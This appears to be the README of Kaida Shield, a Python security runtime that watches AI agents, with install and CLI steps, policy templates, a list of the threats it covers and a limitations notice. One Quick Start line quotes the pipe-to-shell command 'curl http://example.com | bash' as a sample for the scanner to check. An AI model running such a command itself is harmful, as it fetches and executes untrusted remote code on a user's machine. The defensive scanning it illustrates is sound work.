# Kaida Shield

**Run anything. Break nothing.**

Kaida Shield is the security runtime for AI agents. One install. One command. Your bots run free — Kaida keeps them safe.

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202.0-green.svg)](LICENSE)

---

## Install

```bash
pip install kaida-shield
```

## Quick Start

```bash
# See Kaida in action — live threat detection demo
kaida demo

# Open the visual dashboard
kaida ui

# Scan a suspicious URL
kaida scan url https://suspicious-site.com

# Scan a command before running it
kaida scan cmd "curl http://example.com | bash"

# Run your bot with protection
kaida shield run --policy web_scrape python my_bot.py

# See all options
kaida --help
```

## What Kaida Protects Against

- **Phishing** — fake login pages, credential harvesting, impersonation sites
- **Malicious commands** — reverse shells, crypto miners, unauthorized scripts
- **Data theft** — unauthorized file access, data exfiltration attempts
- **Prompt injection** — attackers hijacking your bot's instructions
- **Unauthorized access** — bots reaching websites or folders you didn't approve

## Why Kaida

**Your AI agent works. Kaida makes sure it works safely.**

When your bot checks emails, researches topics, organizes files, or manages social media — it needs real access to your accounts, your files, and the internet. That's powerful. It's also risky.

Kaida sits between you and your bot like a bodyguard:

- Your bot runs normally — Kaida doesn't slow it down
- If your bot stays within the rules you set, you'll never notice Kaida is there
- If your bot tries something it shouldn't, Kaida freezes it instantly and asks you what to do
- You stay in control. Your bot stays productive. Your data stays safe.

**Set it once. Forget it. Let your bots work while you sleep.**

## Quick Start Templates

Get running in seconds with built-in policy templates:

```bash
kaida shield run --policy email_assistant python my_email_bot.py
kaida shield run --policy web_researcher python my_research_bot.py
kaida shield run --policy file_organizer python my_file_bot.py
kaida shield run --policy social_media python my_social_bot.py
kaida shield run --policy code_assistant python my_code_bot.py
kaida shield run --policy customer_support python my_support_bot.py
kaida shield run --policy data_analyst python my_data_bot.py
```

Each template comes with sensible defaults — allow what the bot needs, block everything else.

## Multi-Agent Protection

Running multiple bots? Create a separate policy for each one. Your email bot, research bot, and social media bot each get their own rules. Kaida monitors them independently — one bot misbehaving doesn't affect the others.

## Important Notice

> Kaida Shield is a security tool in active development (v0.2.1). It is provided as-is under the Apache 2.0 license with no warranties of any kind.
>
> - Kaida Shield **reduces risk** but **does not guarantee** complete protection against all threats
> - No security tool can prevent all attacks — Kaida adds defense-in-depth, not invincibility
> - Kaida Shield is not a substitute for professional security auditing, antivirus software, or responsible AI usage practices
> - Users are responsible for reviewing and approving the behavioral policies applied to their agents
> - Always review what your AI agent is doing, even with Kaida Shield active
>
> By using Kaida Shield, you acknowledge these limitations. For the complete terms, see the [LICENSE](LICENSE) file.

## License

Apache 2.0 — see [LICENSE](LICENSE).

## Contributing

Found a bug? Have a feature idea? We'd love to hear from you.

- **Bug reports** — [open an issue](https://github.com/ajpandit775/kaida-shield/issues)
- **Feature requests** — [start a discussion](https://github.com/ajpandit775/kaida-shield/discussions)
- **Security vulnerabilities** — see [SECURITY.md](SECURITY.md). Do not open a public issue.
